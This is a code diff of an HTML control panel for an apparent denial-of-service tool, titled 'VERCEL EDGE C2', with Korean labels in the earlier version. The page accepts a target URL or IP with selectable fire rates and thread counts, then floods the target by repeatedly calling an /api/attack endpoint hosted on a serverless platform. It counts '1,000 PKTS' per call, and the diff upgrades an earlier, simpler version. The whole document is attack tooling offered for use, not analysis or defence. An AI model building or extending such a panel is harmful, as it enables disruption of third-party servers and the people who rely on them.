@@ -1,42 +1,124 @@
 <!DOCTYPE html>
-<html>
+<html lang="ko">
 <head>
-    <title>VERCEL EDGE C2 - FINAL</title>
+    <meta charset="UTF-8">
+    <title>⚡ VERCEL EDGE COMMANDER</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
-        input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; margin-bottom: 20px; outline: none; }
-        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; font-size: 1.1em; }
-        button:hover { background: #0c0; box-shadow: 0 0 10px #0f0; }
-        #log { margin-top: 20px; font-size: 1.2em; font-weight: bold; height: 200px; overflow-y: auto; background: #111; padding: 10px; }
+        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+        .full-width { grid-column: span 2; }
+        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
+        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
+        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
+        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1em; }
+        #startBtn { background: var(--neon); color: #000; }
+        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
+        #startBtn:hover { box-shadow: 0 0 20px var(--neon); }
+        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; box-shadow: inset 0 0 10px #000; }
+        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: scan 0.2s ease-out; }
+        .log-err { color: var(--warn); border-left-color: var(--warn); }
+        @keyframes scan { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.9em; color: #888; }
     </style>
 </head>
 <body>
-    <h1>[ VERCEL EDGE C2 ]</h1>
-    <p>대상 IP 또는 URL 입력 (토큰 필요 없음):</p>
-    <input type="text" id="target" placeholder="http://1.2.3.4" value="http://">
-    <br>
-    <button onclick="startAttack()">초고속 연사 시작 (FIRE)</button>
-    <div id="log">상태: 대기 중...</div>
+    <div class="header">
+        <h1>[ EDGE-FLOW C2 TERMINAL v3.5 ]</h1>
+        <div class="stats">
+            <span>STATUS: <span id="statusText">READY</span></span>
+            <span>TOTAL SHOTS: <span id="shotCount">0</span></span>
+        </div>
+    </div>
+
+    <div class="controls">
+        <div class="full-width">
+            <label>TARGET ADDRESS (URL/IP)</label>
+            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
+        </div>
+        <div>
+            <label>FIRE RATE (INTERVAL ms)</label>
+            <select id="rate">
+                <option value="500">Normal (500ms)</option>
+                <option value="200">Fast (200ms)</option>
+                <option value="100" selected>Turbo (100ms)</option>
+                <option value="50">INSANE (50ms)</option>
+            </select>
+        </div>
+        <div>
+            <label>POWER (THREADS)</label>
+            <select id="threads">
+                <option value="1">Low (1x)</option>
+                <option value="5">Medium (5x)</option>
+                <option value="10" selected>High (10x)</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="btn-group">
+        <button id="startBtn" onclick="initiate()">MISSION START</button>
+        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
+    </div>
+
+    <div id="terminal">>> SYSTEM INITIALIZED... WAITING FOR TARGET...</div>
 
     <script>
-        async function startAttack() {
-            const target = document.getElementById('target').value;
-            const logDiv = document.getElementById('log');
-            logDiv.innerHTML = `<span style="color:yellow">공격 개시: ${target}</span><br>`;
+        let attackInterval = null;
+        let totalShots = 0;
 
-            // 0.1초마다 Vercel 에지 엔진(/api/attack) 호출
-            setInterval(async () => {
-                try {
-                    // GitHub API를 거치지 않고 내 Vercel 서버로 직접 쏨
-                    const res = await fetch(`/api/attack?target=${target}`);
-                    const text = await res.text();
-                    const line = document.createElement('div');
-                    line.innerText = `> ${new Date().toLocaleTimeString()} : ${text}`;
-                    logDiv.prepend(line);
-                } catch (e) {
-                    console.error("연사 실패:", e);
+        function log(msg, isError = false) {
+            const term = document.getElementById('terminal');
+            const div = document.createElement('div');
+            div.className = `log-entry ${isError ? 'log-err' : ''}`;
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            term.prepend(div);
+            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
+        }
+
+        async function initiate() {
+            const target = document.getElementById('target').value;
+            const rate = parseInt(document.getElementById('rate').value);
+            const threads = parseInt(document.getElementById('threads').value);
+
+            if (!target.startsWith('http')) {
+                log("ERROR: INVALID TARGET PROTOCOL", true);
+                return;
+            }
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').style.opacity = "0.5";
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('stopBtn').style.opacity = "1";
+            document.getElementById('statusText').innerText = "FIRING...";
+            document.getElementById('statusText').style.color = "red";
+
+            log(`INITIATING ATTACK ON ${target}...`);
+            log(`MODE: ${threads} THREADS / ${rate}ms INTERVAL`);
+
+            attackInterval = setInterval(() => {
+                for(let i=0; i < threads; i++) {
+                    fetch(`/api/attack?target=${target}`)
+                        .then(res => res.text())
+                        .then(data => {
+                            totalShots += 1000;
+                            document.getElementById('shotCount').innerText = totalShots.toLocaleString();
+                            log(`SUCCESS: 1,000 PKTS DELIVERED`);
+                        })
+                        .catch(e => log("PACKET DROPPED (TARGET BUSY)", true));
                 }
-            }, 100); 
+            }, rate);
+        }
+
+        function terminate() {
+            clearInterval(attackInterval);
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').style.opacity = "1";
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('stopBtn').style.opacity = "0.5";
+            document.getElementById('statusText').innerText = "READY";
+            document.getElementById('statusText').style.color = "var(--neon)";
+            log("!!! MISSION TERMINATED BY OPERATOR !!!", true);
         }
     </script>
 </body>
